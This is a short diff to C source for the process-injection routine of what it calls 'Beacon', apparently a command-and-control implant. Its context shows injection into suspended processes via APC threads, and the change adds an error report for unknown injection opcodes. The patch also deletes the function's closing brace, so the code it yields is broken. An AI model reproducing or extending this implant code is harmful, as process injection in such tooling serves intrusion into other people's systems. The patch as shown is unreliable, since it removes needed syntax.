@@ -131,11 +131,19 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
 					return TRUE;
 				break;
+
+			default:
+				/* C-26 build identity: an opcode this build does not know means
+				 * the TS profile is newer than the running beacon (the stale-slot
+				 * class - the old build silently skipped unknown techniques and a
+				 * test cycle burned on a misdiagnosis). Bark loudly. */
+				post_error_d(0x5f, opcode);
+				break;
 		}
 	}
 
 	return FALSE;
-}
+
 
 /*
 * This function is the master tree for Beacon's process injection logic. It's a little ugly, but thought out. Here's what the parameters mean:
